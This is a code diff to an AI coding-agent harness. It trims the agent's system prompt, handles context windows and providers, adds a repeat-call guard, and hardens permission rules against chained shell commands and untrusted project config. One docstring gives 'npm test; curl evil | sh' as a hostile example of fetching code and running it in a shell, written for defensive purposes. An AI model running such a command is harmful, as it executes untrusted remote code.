@@ -74,7 +74,47 @@ def _codex_prompt() -> str:
         text = (C.APP / "defaults" / "engines" / "codex" / "prompt.md").read_text(encoding="utf-8")
     except OSError:
         return "You are a coding agent. Use the shell and apply_patch tools to complete the user's task."
-    return re.sub(r"\A\s*<!--.*?-->\s*", "", text, count=1, flags=re.S)
+    text = re.sub(r"\A\s*<!--.*?-->\s*", "", text, count=1, flags=re.S)
+    if os.environ.get("MH_CODEX_PROMPT") == "full":
+        return text
+    text = _trim_codex(text)
+    if os.environ.get("MH_FINISH_CHECK", "0") != "1":      # MH_FINISH_CHECK=1: re-check each requirement before the answer
+        text = re.sub(r"## Before you finish\n.*?\n\n", "", text, count=1, flags=re.S)
+    if os.environ.get("MH_SCAN_RULE", "0") == "1":         # MH_SCAN_RULE=1: no whole-file-system scans, no sandbox copies
+        text = text.rstrip() + ("\n\nTest with the project's own tests or a short script in the project; do not scan the "
+                               "file system (`find /`) or copy the project elsewhere to test it.\n")
+    return text
+
+
+_TRIM = (
+    # (start heading, end heading, replacement): what the model does not need on every call. The examples of
+    # preambles and plans and the long answer-formatting rules cost about 2.5k tokens per call and made the model
+    # write a sentence before each tool call and long final answers.
+    ("# AGENTS.md spec\n", "## Responsiveness\n",
+     "# AGENTS.md\nA project's AGENTS.md (any folder) holds its conventions and is binding for the files you touch; "
+     "the one at the project root is already included below.\n\n"),
+    ("## Responsiveness\n", "## Planning\n",
+     "## Responsiveness\nDo not write a sentence before tool calls: just call the tools. Write only the final "
+     "answer.\n\n"),
+    ("### Examples\n", "## Task execution\n", ""),
+    ("## Sharing progress updates\n", "## Presenting your work and final message\n",
+     "## Before you finish\nRe-read the request. For each requirement, check your code or a run against its exact "
+     "words: the keys and values returned, empty and single-item inputs, ordering, errors. A requirement you only "
+     "assumed is not done; fix what fails, then answer.\n\n"),
+    ("### Final answer structure and style guidelines\n", "# Sandbox and approvals\n",
+     "### Final answer style\nPlain text. At most 10 lines: what changed and how you checked it, nothing else. "
+     "Do not restate the task, list every edit, or paste code you wrote. Use `-` bullets and backticks for "
+     "commands, paths and identifiers; no headers for short answers.\n\n"),
+)
+
+
+def _trim_codex(text: str) -> str:
+    for a, b, new in _TRIM:
+        i = text.find(a)
+        j = text.find(b, i + len(a)) if i >= 0 else -1
+        if i >= 0 and j > i:
+            text = text[:i] + new + text[j:]
+    return text
 
 T.SCHEMAS.setdefault("ask_user", ASK.SCHEMA)
 from meshpool_harness.agent import planning as _PLAN  # noqa: E402
@@ -325,11 +365,14 @@ def _probe_once(base: str, key: str, model: str, sink=None) -> str:
     A 500 is an answer (the gateway is serving, this model or request failed); 502/503/504 mean it is not serving."""
     body = {"model": model, "max_tokens": 1, "messages": [{"role": "user", "content": "ping"}]}
     from meshpool_harness import providers as _PV
-    if _PV.key_wire() == "anthropic" and base.rstrip("/") == _PV.key_base():          # the Messages API (see Agent._post)
+    if _PV.wire_for(base) == "anthropic":          # the Messages API (see Agent._post)
         from meshpool_harness.core import anthropic_wire as AW
-        url, body, hdrs = f"{base}/messages", AW.to_request(body), AW.headers(key)
+        body = AW.to_request(body)
+        url, hdrs = _PV.chat_target(base, key, model, "messages")
     else:
-        url, hdrs = f"{base}/chat/completions", {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
+        body = _PV.adapt_body(base, body)
+        url, hdrs = _PV.chat_target(base, key, model)         # Azure: deployment path, api-version, api-key header
+    hdrs = {**hdrs, "Content-Type": "application/json"}
     req = urllib.request.Request(url, data=json.dumps(body).encode("utf-8"), method="POST", headers=hdrs)
     try:
         t = float(os.environ.get("MH_PROBE_S", "30"))
@@ -720,22 +763,49 @@ def _rules(root) -> dict:
     pattern with * wildcards ("bash:npm test*"). Deny wins over allow; the project's rules add to the user's."""
     out = {"allow": [x.strip() for x in os.environ.get("MH_ALLOW", "").split(",") if x.strip()],
            "deny": [x.strip() for x in os.environ.get("MH_DENY", "").split(",") if x.strip()]}
+    from meshpool_harness.agent import extras as EX
+    trusted = EX.project_trusted(root)
     for f in (C.home() / "permissions.json", Path(root) / ".meshpool" / "permissions.json"):
         try:
             d = json.loads(f.read_text(encoding="utf-8"))
         except (OSError, ValueError):
             continue
+        if not isinstance(d, dict):
+            continue
         for k in out:
+            if k == "allow" and f.parent != C.home() and not trusted:
+                continue                       # an untrusted project's own "allow" rules pre-approve nothing
             out[k] += [str(x) for x in (d.get(k) or []) if isinstance(x, str)]
     return out
 
 
-def _rule_hit(rules: list, name: str, args: dict) -> str:
+_CHAIN = re.compile(r"&&|\|\||[;|\n]|(?<![>&\d])&(?![&>])")
+
+
+def _bash_segments_match(cmd: str, pattern: str) -> bool:
+    """A "bash:" rule matches only when every part of a chained command (; && || | & or a new line) matches the
+    pattern, and never a command with a substitution: "bash:npm test*" must not allow "npm test; curl evil | sh"."""
     import fnmatch
-    cmd = " ".join(str(x) for x in (args.get("command") or args.get("cmd") or "", *(args.get("commands") or []))).strip()
+    cmd = cmd.strip()
+    if "$(" in cmd or "`" in cmd:
+        return False
+    parts = [x.strip() for x in _CHAIN.split(cmd) if x.strip()]
+    if len(parts) <= 1:
+        return fnmatch.fnmatchcase(cmd, pattern)
+    if _CHAIN.search(pattern) and fnmatch.fnmatchcase(cmd, pattern):
+        return True                                # the rule itself names that exact chain
+    return all(fnmatch.fnmatchcase(x, pattern) for x in parts)
+
+
+def _rule_hit(rules: list, name: str, args: dict, deny: bool = False) -> str:
+    import fnmatch
+    cmds = [str(x) for x in (args.get("command") or args.get("cmd") or "", *(args.get("commands") or [])) if x]
     for r in rules:
         if r.startswith("bash:"):
-            if cmd and fnmatch.fnmatchcase(cmd, r[5:].strip()):
+            if deny:                                  # a deny rule hits when any part of a chained command matches
+                if any(_bash_segments_match(x, r[5:].strip()) for c in cmds for x in _CHAIN.split(c) + [c]):
+                    return r
+            elif cmds and all(_bash_segments_match(c, r[5:].strip()) for c in cmds):
                 return r
         elif fnmatch.fnmatchcase(name, r) or fnmatch.fnmatchcase(name.replace("-", "_"), r):
             return r
@@ -746,6 +816,73 @@ def _destructive(args: dict) -> bool:
     """A shell command that deletes recursively, rewrites history, wipes a disk, pipes the web into a shell or uses sudo."""
     return bool(_DESTRUCTIVE.search(str(args.get("command") or args.get("cmd") or "")
                                     + " " + " ".join(map(str, args.get("commands") or []))))
+
+
+_CHAT_TOOLS = frozenset({"read_file", "grep", "glob", "edit", "write_file", "bash", "web_search", "web_research",
+                         "fetch_url", "office_task"})
+
+
+def _elide_old_calls(msgs: list, keep: int = 3, limit: int = 500) -> list:
+    """The long text in the arguments of older tool calls (a whole patch, a script) becomes a short stub: the file is on
+    disk and the result was seen, but the text rode along on every later request (186k tokens in one 34-call task).
+    Only a copy for the request; the newest `keep` calls stay as written, so the prompt prefix before them is stable."""
+    idx = [i for i, m in enumerate(msgs) if m.get("role") == "assistant" and m.get("tool_calls")]
+    old = idx[:-keep] if keep else idx
+    if not old:
+        return msgs
+    out = list(msgs)
+
+    def cut(v):
+        if isinstance(v, str) and len(v) > limit:
+            return v[:160] + f" ... [{len(v) - 160} more characters left out of the history] ..."
+        if isinstance(v, list):
+            return [cut(x) for x in v]
+        if isinstance(v, dict):
+            return {k: cut(x) for k, x in v.items()}
+        return v
+    for i in old:
+        calls = []
+        for c in msgs[i]["tool_calls"]:
+            f = c.get("function") or {}
+            a = f.get("arguments")
+            if isinstance(a, str) and len(a) > limit:
+                try:
+                    a2 = json.dumps(cut(json.loads(a)), ensure_ascii=False)
+                except ValueError:
+                    a2 = a
+                c = dict(c, function=dict(f, arguments=a2))
+            calls.append(c)
+        out[i] = dict(msgs[i], tool_calls=calls)
+    return out
+
+
+def _cache_hints_ok(base: str) -> bool:
+    """prompt_cache_key and user are optional routing hints that OpenAI, Azure OpenAI and the Meshpool gateway read;
+    other OpenAI-compatible servers (Ollama, LM Studio, Mistral, vLLM...) may reject fields they do not know."""
+    try:
+        from meshpool_harness import providers as PV
+        h = PV.host(base)
+        return h.endswith(("openai.com", "meshpool.ai", "openai.azure.com", "deepseek.com")) or PV.is_azure(base)
+    except Exception:  # noqa: BLE001
+        return False
+
+
+def _bad_reply(resp) -> str:
+    """Why a successful HTTP reply is not a model reply (an error body, no choices, a null message, a content filter
+    with nothing in it), or "" when it is one."""
+    if not isinstance(resp, dict):
+        return "not a JSON object"
+    ch = resp.get("choices")
+    if not ch or not isinstance(ch, list) or not isinstance(ch[0], dict):
+        e = resp.get("error")
+        e = (e.get("message") if isinstance(e, dict) else e) or ""
+        return ("error: " + str(e)[:160]) if e else "no choices"
+    m = ch[0].get("message")
+    if not isinstance(m, dict):
+        return "no message"
+    if ch[0].get("finish_reason") == "content_filter" and not (m.get("content") or m.get("tool_calls")):
+        return "blocked by a content filter"
+    return ""
 
 
 class Agent:
@@ -906,8 +1043,16 @@ class Agent:
             return T.schemas(T.CODEX_TOOLS) + ([x for x in self.mcp.schemas() if keep(x["function"]["name"])]
                                                if self.mcp else [])
         names = self._tool_names()
-        if "delegate_task" not in names and getattr(self, "_delegate_depth", 0) == 0 and _subagents_on():
-            names = names + ["delegate_task"]
+        if getattr(self, "lane", "task") == "chat" and not getattr(self, "_tools_full", False) \
+                and os.environ.get("MH_LITE_CHAT_TOOLS", "1") != "0":
+            # A quick question carries the tools it can need (look, change, run, search), not the 19 of a long job:
+            # 2k tokens less on every call. Once a message asks for more, the whole set stays for the chat, so the
+            # prompt prefix does not flip back and forth.
+            names = [n for n in names if n in _CHAT_TOOLS]
+        else:
+            self._tools_full = True
+            if "delegate_task" not in names and getattr(self, "_delegate_depth", 0) == 0 and _subagents_on():
+                names = names + ["delegate_task"]
         drop = self._dropped()
         if drop:
             names = [n for n in names if n not in drop]
@@ -1032,6 +1177,13 @@ class Agent:
         return bool(items)
 
     def reset(self):
+        # a new conversation gets its own session folder: the next save() must not overwrite the one just left
+        self.id = time.strftime("%Y%m%d-%H%M%S-") + uuid.uuid4().hex[:4]
+        self.dir = self.dir.parent / self.id
+        self.created = time.time()
+        self.usage = {"in": 0, "cached": 0, "out": 0, "calls": 0}
+        self._todos = []
+        self.unfinished = False
         self.messages = [{"role": "system", "content": self.system_prompt()}]
         self.ws = Workspace(str(self.root), str(self.dir / "tool-output"))
         self.ws.should_stop = lambda: self._stop
@@ -1047,6 +1199,12 @@ class Agent:
         cmd = EX.expand_command(text, self.root)          # /name from .meshpool/commands
         if cmd:
             text = cmd
+        ignored = EX.untrusted_config(self.root)
+        if ignored and not getattr(self, "_trust_noted", False):
+            self._trust_noted = True
+            self.emit({"type": "status", "text": "This folder has " + " and ".join(".meshpool/" + n for n in ignored)
+                       + ", which can run commands or pre-approve them. They are ignored until you trust the folder "
+                       "(type /trust)."})
         blocked, note = EX.run_hooks(self.root, "UserPromptSubmit", {"prompt": text})
         if blocked:
             self.emit({"type": "error", "text": "A hook stopped this message: " + note})
@@ -1176,6 +1334,8 @@ class Agent:
                     self.messages.append({"role": "user", "content": PACE.WRAP})
                     self._no_tools = True
                 self._finish = None
+                if g.pop("hard_wrap", False):
+                    self._no_tools = True                 # stuck for good: best-effort answer instead of more calls
                 try:
                     msg, streamed = self._chat(turn)
                 finally:
@@ -1184,12 +1344,23 @@ class Agent:
                 cut = {i for i, c in enumerate(msg.get("tool_calls") or []) if cut_off and not _args_ok(c)}
                 calls = _sanitize_calls(msg.get("tool_calls") or [])
                 cut = {calls[i]["id"] for i in cut}
+                for c in calls:                        # a call without a name makes every later request invalid
+                    if not isinstance(c.get("function"), dict):
+                        c["function"] = {"arguments": "{}"}
+                    if not c["function"].get("name"):
+                        c["function"]["name"] = "unknown"
                 content = msg.get("content") or ""
                 self._scrubber = None                  # the next reply starts a fresh stream scrubber
                 if "<memory-context>" in content:
                     from meshpool_harness.assistant import scrub
                     content = scrub(content)
-                keep = {"role": "assistant", "content": content or ("" if calls else "(no reply)")}
+                if not calls and not content.strip() and not said:
+                    # nothing said and nothing asked for: not a reply to keep in the history
+                    self.emit({"type": "assistant", "text": "", "streamed": streamed, "has_tools": False})
+                    self.emit({"type": "error", "text": "The model returned an empty reply. Send your message again, "
+                                                        "or switch to another model."})
+                    return ""
+                keep = {"role": "assistant", "content": content or ""}
                 if calls:
                     keep["tool_calls"] = calls
                 self.messages.append(keep)
@@ -1383,6 +1554,15 @@ class Agent:
                 "after_plan": bool(g.get("after_plan")), "deep": getattr(route, "lane", "") == "deep",
                 "root": str(self.root)}
 
+    def _small_code_verified(self) -> bool:
+        """A code task (not a document, deck or app) where the agent ran something after its last edit and the last
+        such run succeeded. The independent grader on these cost 2 to 4 times the task itself (measured: $0.0086 against
+        $0.0024 per task) and found nothing the passing run had not; it stays for plans, long jobs and app tasks."""
+        if self.profile != "code":
+            return False
+        after = [c for c in self.ws.commands if c.get("after_edit", -1) >= self.ws.edits and c.get("kind") != "read"]
+        return bool(after) and after[-1].get("code") == 0
+
     def _grade_commands(self, g: dict) -> list:
         return [c for c in self.ws.commands[g.get("cmd0", 0):] if c.get("kind") != "read"] or \
             self.ws.commands[g.get("cmd0", 0):][-6:]
@@ -1406,6 +1586,8 @@ class Agent:
             why = "you asked for it" if force else GR.large(info)
             if not why:
                 return False, final
+            if why.startswith("files made") and self._small_code_verified() and os.environ.get("MH_GRADER_SMALL", "0") != "1":
+                return False, final        # a small code change whose own checks passed: no second model loop (MH_GRADER_SMALL=1 keeps it)
             rounds = g.get("grade_rounds", 0)
             self.emit({"type": "status", "text": "Independent check: a separate reviewer is checking the result"
                        + (f" (round {rounds + 1})" if rounds else "") + "..."})
@@ -1554,8 +1736,11 @@ class Agent:
         try:
             f = c.get("function", {})
             name, args = f.get("name", ""), str(f.get("arguments", ""))
-            if not self._inspection(name, args):     # only read-only looks repeat uselessly: polling a CI run, rerunning
-                return self._run_tool(c, cut=cut)    # a flaky check or an MCP call can rightly repeat with no edit
+            bg = self.ws.__dict__.get("_bg") or {}
+            if any(e["p"].poll() is None for e in list(bg.values())) or not self._inspection(name, args):
+                # a background command is running (its output changes with no edit), or the call is not a read-only
+                # look: a flaky check or an MCP call can rightly repeat with no edit
+                return self._repeat_guard(c, g, cut)
             exact = name + ":" + args[:2000]
             # numbers-only variation (od -c | sed -n '8,9p', '9,10p') is a loop for shell commands only: read_file on
             # other line ranges or files numbered chunk_01, chunk_02 is real progress through a file
@@ -1576,7 +1761,43 @@ class Agent:
                 book.setdefault(key, []).append(edits)
         except Exception:  # noqa: BLE001 - the guard must never break a turn
             pass
-        return self._run_tool(c, cut=cut)
+        return self._repeat_guard(c, g, cut)
+
+    def _repeat_guard(self, c: dict, g: dict, cut: bool = False) -> str:
+        """Run a tool call, unless the same call has just run three times in a row with the same result: a fourth time
+        cannot tell the model anything new (one such loop, 60 calls and 1M tokens, cost more than a hundred tasks).
+        Switches, all off by default (not measured on the 52 tasks yet):
+        MH_REPEAT_WINDOW=1  count over the last 12 calls, not only in a row, and only while no file changed;
+        MH_REPEAT_SHAPE=1   a shell command that differs only in its numbers counts as the same call;
+        MH_FAILURE_HINT=1   the second identical failure gets a note to change approach."""
+        f = c.get("function", {})
+        key = str(f.get("name", "")) + ":" + str(f.get("arguments", ""))[:2000]
+        if os.environ.get("MH_REPEAT_SHAPE") == "1" and f.get("name") in ("shell", "bash", "bash_many"):
+            key = re.sub(r"\d+", "#", key)
+        runs = g.setdefault("same", [])
+        edits = self.ws.edits
+        if os.environ.get("MH_REPEAT_WINDOW") == "1":
+            stuck = (sum(1 for r in runs if r[0] == key and r[2] == edits and r[3]) >= 3
+                     and len({r[1] for r in runs if r[0] == key and r[2] == edits}) == 1)
+        else:
+            stuck = (len(runs) >= 3 and all(r[0] == key and r[3] for r in runs[-3:])
+                 and len({r[1] for r in runs[-3:]}) == 1)
+        if stuck:
+            g["refused"] = g.get("refused", 0) + 1
+            return ("[Meshpool] Not run: this exact call has run three times with the same result. Running it again "
+                    "changes nothing. Change the command or the files first, or finish and tell the user what is "
+                    "blocking you.")
+        out = self._run_tool(c, cut=cut)
+        import hashlib
+        h = hashlib.md5(str(out).encode("utf-8", "replace")).hexdigest()
+        failed = bool(re.search(r"\[exit (?!0\b)\d+\]|timed out|Traceback|Error|failed|not found", str(out)))
+        if os.environ.get("MH_FAILURE_HINT") == "1" and failed and \
+                any(r[0] == key and r[1] == h and r[2] == edits for r in runs):
+            out = str(out) + ("\n[Meshpool] The same call failed the same way again. Do not repeat it: narrow it (one "
+                              "case, a shorter timeout), print what it is waiting on, or change the code first.")
+        runs.append((key, h, edits, failed))     # only a call that failed counts: a poll that says "pending" may repeat
+        del runs[:-12]
+        return out
 
     @staticmethod
     def _inspection(name: str, args: str) -> bool:
@@ -1636,6 +1857,11 @@ class Agent:
             notes.append(f"{step - g['last']} steps without progress (no file changed, no new command succeeded). "
                          "Your current approach is not converging. In one sentence, state a different hypothesis or "
                          "a simpler route, then try it.")
+        elif step - g["last"] >= int(os.environ.get("MH_STUCK_STEPS", "36")) and self.profile == "code" \
+                and not g.get("hard_wrap_done"):
+            g["hard_wrap_done"] = g["hard_wrap"] = True   # once: the next call has no tools and must answer
+            notes.append("You have made no progress for a long time. Stop here: say what works, what does not, and "
+                         "what you would try next. Do not call another tool.")
         if self.max_steps >= 30 and step == self.max_steps - 15:
             notes.append("15 steps left in this turn. Make sure what the user asked for exists and works now; refine "
                          "it afterwards if steps remain.")
@@ -1724,6 +1950,13 @@ class Agent:
         # Older tool outputs are elided once the context passes the limit, down to 60% of it, so the next trim is
         # many steps away and the provider's prompt cache is rebuilt rarely. Recent outputs stay verbatim.
         limit = int(self.hsettings()["compact_chars"])
+        try:                                       # never above 70% of the model's real window (core/context.py)
+            from meshpool_harness.core import context as CTX
+            win = self._ctx_window()
+            fixed = CTX.estimate(self.tool_schemas()) + 600
+            limit = min(limit, CTX.compact_chars(win, fixed, limit))
+        except Exception:  # noqa: BLE001
+            pass
         if _context_size(self.messages) > limit:
             _shrink_context(self.messages, int(limit * 0.6))
             self.emit({"type": "status", "text": "Older tool outputs were shortened to keep the context small."})
@@ -1738,7 +1971,11 @@ class Agent:
             EX.run_hooks(self.root, "PreCompact", {"messages": len(self.messages)})
         except Exception:  # noqa: BLE001
             pass
-        r = compaction.compact_history(self.messages)
+        try:
+            win = self._ctx_window()
+        except Exception:  # noqa: BLE001
+            win = None
+        r = compaction.compact_history(self.messages, win=win)
         if r:
             self.emit({"type": "status", "text": f"Summarized {r['removed']} earlier messages so the task can keep "
                                                  "going" + ("." if r["model"] else " (from the log only).")})
@@ -1748,6 +1985,31 @@ class Agent:
                 pass
         return r
 
+    def _ctx_window(self) -> int:
+        """The model's context window in tokens (core/context.py): override, what the endpoint reports, or a default."""
+        from meshpool_harness import providers as PV
+        from meshpool_harness.core import context as CTX
+        model = self.current_model()
+        prov = PV.split(model)[0]
+        base, key = PV.endpoint(prov) if prov != "chatgpt" else ("", "")
+        return CTX.window(model, base, key)
+
+    def _fit_body(self, body: dict) -> None:
+        """Keep the request inside the model's window: compact tool schemas, capped instructions, elided old output,
+        a reply limit that leaves room. A one-line notice the first time a small window is seen."""
+        from meshpool_harness.core import context as CTX
+        win = self._ctx_window()
+        CTX.tell_once(self.current_model(), win, lambda t: self.emit({"type": "status", "text": t}), "agent")
+        self.ws.max_tool_chars = CTX.tool_output_chars(win)
+        key = "max_completion_tokens" if "max_completion_tokens" in body else "max_tokens"
+        msgs, tools, out = CTX.fit(body["messages"], body.get("tools"), win, body.get(key),
+                                   getattr(self, "_ctx_tighten", 1.0))
+        body["messages"] = msgs
+        if tools is not None:
+            body["tools"] = tools
+        if key in body:
+            body[key] = out
+
     def _body(self) -> dict:
         from meshpool_harness.profiles import apply, for_model
         model = self.current_model()
@@ -1756,6 +2018,8 @@ class Agent:
         body = {"model": model, "max_tokens": lim, "tools": self.tool_schemas(),
                 "tool_choice": "none" if getattr(self, "_no_tools", False) else "auto"}
         msgs, body = apply(prof, list(self.messages), body, "worker")
+        if os.environ.get("MH_ELIDE_OLD_CALLS", "0") == "1":      # measured: it cost solves, so off unless asked
+            msgs = _elide_old_calls(msgs)
         keep = int(os.environ.get("MH_MAX_IMAGES", "4"))
         if sum(1 for m in msgs if isinstance(m.get("content"), list)
                for p in m["content"] if isinstance(p, dict) and p.get("type") == "image_url") > keep:
@@ -1766,6 +2030,14 @@ class Agent:
         if os.environ.get("MH_TEMPERATURE"):
             body["temperature"] = float(os.environ["MH_TEMPERATURE"])
         body["messages"] = msgs
+        caps = self._caps(model, prof)
+        eff = caps.effort(getattr(self, "lane", "task"), str(prof.get("reasoning_effort") or ""))
+        if eff and "reasoning_effort" not in body:
+            body["reasoning_effort"] = eff            # never the provider's default (high): hidden tokens cost money
+        try:
+            self._fit_body(body)
+        except Exception:  # noqa: BLE001 - fitting is an optimisation: never stop the turn over it
+            pass
         if os.environ.get("MH_CACHE_KEY", "1") == "1":
             body["prompt_cache_key"] = self.route_id()
             body["user"] = self.route_id()
@@ -1781,6 +2053,13 @@ class Agent:
             pass
         return body
 
+    def _caps(self, model: str, prof: dict | None = None):
+        """What this model on its endpoint can do (core/modelcaps.py): every provider-specific choice reads this."""
+        from meshpool_harness import providers as PV
+        from meshpool_harness.core import modelcaps as MC
+        prov, bare = PV.split(model)
+        return MC.resolve(PV.endpoint(prov)[0], bare, prof)
+
     def _chat(self, turn: dict) -> tuple[dict, bool]:
         body = self._body()
         # The model's provider decides where the call goes (providers.py): the key endpoint in settings or the
@@ -1789,15 +2068,18 @@ class Agent:
         prov, body["model"] = PV.split(body["model"])
         base, key = PV.endpoint(prov)         # the key endpoint: providers.key()/key_base() (an OpenAI key only
                                                # with OPENAI_BASE_URL, never with the Meshpool base)
-        wire = "chatgpt" if prov == "chatgpt" else os.environ.get("MH_WIRE", "chat")
-        if not key and wire != "chatgpt":
+        wire = "chatgpt" if prov == "chatgpt" else (
+            "responses" if self._caps(self.current_model()).wire == "responses" else "chat")
+        if not key and wire != "chatgpt" and not PV.keyless_ok(base):
             raise RuntimeError(f"No API key. Add MESHPOOL_API_KEY to {C.config_path()} or open Settings in the app.")
         if wire != "chatgpt" and PV.key_problem(key):
             raise RuntimeError(PV.key_problem(key))
         stream = wire == "chat" and os.environ.get("MH_STREAM", "1") != "0"
         self.emit({"type": "model_start"})
         resp, streamed, cleaned, shrunk, last = None, False, False, False, None
-        attempt, recoveries, swapped = -1, 0, False
+        ctx_shrinks = 0
+        self._ctx_tighten = 1.0
+        attempt, recoveries, swapped, auth_tries = -1, 0, False, 0
         # Rate limits are waited out on their own clock, not counted as failed attempts: a long task that hits the
         # key's limit carries on when the limit resets instead of ending the turn after a few minutes.
         rl_waited, rl_budget, rl_told = 0.0, _rate_limit_budget(), -1e9
@@ -1821,6 +2103,8 @@ class Agent:
                 elif wire == "responses":
                     from meshpool_harness.core.wire import SimpleLedger
                     extra = {k: v for k, v in body.items() if k not in ("model", "messages", "max_tokens", "temperature")}
+                    if "reasoning_effort" in extra:      # the Responses API names it reasoning.effort
+                        extra["reasoning"] = {"effort": extra.pop("reasoning_effort")}
                     resp = SimpleLedger("agent").chat(model=body["model"], messages=body["messages"],
                                                       max_tokens=body.get("max_tokens", 8192),
                                                       temperature=body.get("temperature"), extra=extra, retries=0)
@@ -1835,6 +2119,10 @@ class Agent:
                         ok = True
                     finally:
                         h.release(ok, slot)
+                self._key_ok = key                         # this key has been accepted: a later 401 may be spurious
+                bad = _bad_reply(resp)
+                if bad:                                # a 200 that carries no reply: retry or report, never "(no reply)"
+                    raise RuntimeError("HTTP 0: the model endpoint sent no usable reply (" + bad + ")")
                 self._first_scale = 1.0
                 break
             except (Interrupted, KeyboardInterrupt):
@@ -1860,6 +2148,12 @@ class Agent:
                     raise
                 kind = classify_error(msg)                 # the same reading as LiveClient.chat (core/client.py)
                 if kind == "auth":
+                    # A gateway under load answers a good key with a spurious 401 now and then. A key that worked
+                    # earlier in this chat gets two short retries; any key gets one, so a bad key still fails fast.
+                    auth_tries += 1
+                    if auth_tries <= (2 if getattr(self, "_key_ok", None) == key else 1):
+                        self._sleep(auth_tries)
+                        continue
                     raise RuntimeError("The endpoint rejected the API key. Check it in settings. " + msg[:200])
                 if kind == "model_missing":
                     # A chat from weeks ago on a model the endpoint has dropped: continue on today's default for
@@ -1881,8 +2175,17 @@ class Agent:
                         continue
                     raise RuntimeError(f"The endpoint does not serve the model {body['model']}. Choose another model "
                                        f"for this chat. ({msg[:160]})")
-                if kind == "context" and not shrunk:       # over the model's context: shrink hard, retry once
+                if kind == "context" and ctx_shrinks < 4:  # over the model's context: shrink hard, retry at once
+                    ctx_shrinks += 1
                     shrunk = True
+                    try:
+                        from meshpool_harness.core import context as CTX
+                        said = CTX.parse_limit(msg)
+                        if said and said < self._ctx_window():
+                            CTX.learn(self.current_model(), said)       # the server named its real window
+                        self._ctx_tighten *= 0.7
+                    except Exception:  # noqa: BLE001
+                        pass
                     # Too long, or too big a request (413): elide older outputs and all but the latest two images,
                     # so a screenshot the user just attached still goes with the retry. Older steps are summarized
                     # first, so the task keeps its thread.
@@ -2007,8 +2310,10 @@ class Agent:
                         self.emit({"type": "status", "text": note})   # one line, saying what was done
                         continue
                     if attempt >= 5:                       # up, yet this conversation's requests keep failing
-                        raise RuntimeError(msg + " [the endpoint answers small requests, but this conversation's "
-                                           "requests keep failing]")
+                        if re.search(r"HTTP 5\d\d", msg):  # the endpoint itself fails: no claim that it is fine
+                            raise RuntimeError(msg)
+                        raise RuntimeError(msg + " (the endpoint answers small requests, but this conversation's "
+                                           "requests keep failing)")
                     if re.search(r"timed out", msg, re.I):   # up but slow to start (prefill, a queue): wait longer
                         self._first_scale = min(5.0, self._first_scale * 2.5)
                     if attempt == 1:                       # a stuck sticky route (cache affinity) upstream: new route
@@ -2047,6 +2352,18 @@ class Agent:
             from meshpool_harness.core.metrics import CacheMeter
             self._meter = CacheMeter()
         self._meter.observe(u, self.usage)                 # full_miss_calls / full_miss_tokens, as in the benchmark loop
+        try:
+            from meshpool_harness.core import modelcaps as _MC
+            _MC.observe_usage(base, body["model"], u)      # does this endpoint report cached / reasoning tokens
+        except Exception:  # noqa: BLE001
+            pass
+        try:                                               # a server that silently cuts a too-long prompt (Ollama)
+            from meshpool_harness.core import context as CTX
+            sent = CTX.estimate(body.get("messages")) + CTX.estimate(body.get("tools") or [])
+            if d["in"] >= 512 and sent > 1500 and sent > d["in"] * 1.6:
+                CTX.learn(self.current_model(), int(d["in"] * 1.02) + CTX.max_output(self._ctx_window(), None))
+        except Exception:  # noqa: BLE001
+            pass
         self.emit({"type": "usage", **d})
         choice = (resp.get("choices") or [{}])[0]
         self._finish = choice.get("finish_reason")
@@ -2213,17 +2530,24 @@ class Agent:
         from meshpool_harness import providers as _PV
         # an Anthropic-style key endpoint (Settings, Models and providers): the Messages API, translated both ways
         # (core/anthropic_wire.py), not streamed; every other endpoint speaks chat completions
-        anthropic = _PV.key_wire() == "anthropic" and base.rstrip("/") == _PV.key_base()
+        anthropic = _PV.wire_for(base) == "anthropic"
         if anthropic:
             from meshpool_harness.core import anthropic_wire as AW
             stream = False
-            b = AW.to_request(b)
-            url, hdrs = f"{base}/messages", AW.headers(key)
+            from meshpool_harness.core import modelcaps as _MC
+            b = AW.to_request(b, cache=_MC.resolve(base, b.get("model", "")).cache == "explicit")
+            url, hdrs = _PV.chat_target(base, key, b.get("model", ""), "messages")
         else:
             if stream:
                 b["stream"] = True
                 b["stream_options"] = {"include_usage": True}
-            url, hdrs = f"{base}/chat/completions", {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
+            b = _PV.adapt_body(base, b)
+            from meshpool_harness.core import modelcaps as _MC
+            if not _MC.resolve(base, b.get("model", "")).cache_hints:    # a strict server refuses fields it does not know
+                b.pop("prompt_cache_key", None)
+                b.pop("user", None)
+            url, hdrs = _PV.chat_target(base, key, b.get("model", ""))    # Azure: deployment path, api-version, api-key
+        hdrs = {**hdrs, "Content-Type": "application/json"}
         req = urllib.request.Request(url, data=json.dumps(b).encode("utf-8"), method="POST",
                                      headers={**hdrs, "X-Harness-Task-Id": self.route_id(), "session_id": self.route_id()})
         # Two clocks: a large context can take minutes before the first byte (prefill, a queue upstream), while a
@@ -2324,6 +2648,13 @@ class Agent:
             carried = len(u.query) + len(u.path) + len(u.fragment) + len(sub)
             return (f"Send this to {host or 'a website'}? The address carries {carried} characters of data."
                     if carried > 300 or len(sub) > 60 or len(u.query) > 200 else "")
+        elif name.replace("-", "_").endswith(("__ui_audit", "__view_output")):
+            p = str(args.get("url") or args.get("path") or "")
+            if re.match(r"^https?://", p, re.I):
+                return ""
+            if re.match(r"^[a-z][a-z0-9+.-]+://", p, re.I) and not re.match(r"^[A-Za-z]:[\\/]", p):
+                return f"Open {p[:80]} (not a web address)?"          # file:// and other schemes read any file
+            p = os.path.expanduser(p)
         else:
             return ""
         try:
@@ -2372,7 +2703,7 @@ class Agent:
         if hk["allow"] and not _destructive(args):
             return True, ""
         rules = _rules(self.root)
-        hit = _rule_hit(rules["deny"], name, args)
+        hit = _rule_hit(rules["deny"], name, args, deny=True)
         if hit:
             return False, f"Not allowed by your saved rule {hit!r} (permissions.json). Do something else, or ask the user to change the rule."
         if _rule_hit(rules["allow"], name, args) and not _destructive(args):
@@ -2701,7 +3032,7 @@ class Agent:
             self._question = p
             end = time.time() + wait
             try:
-                while not p["ev"].wait(0.2):
+                while not p["ev"].wait(0.5):
                     if self._stop:
                         break
                     if time.time() > end:
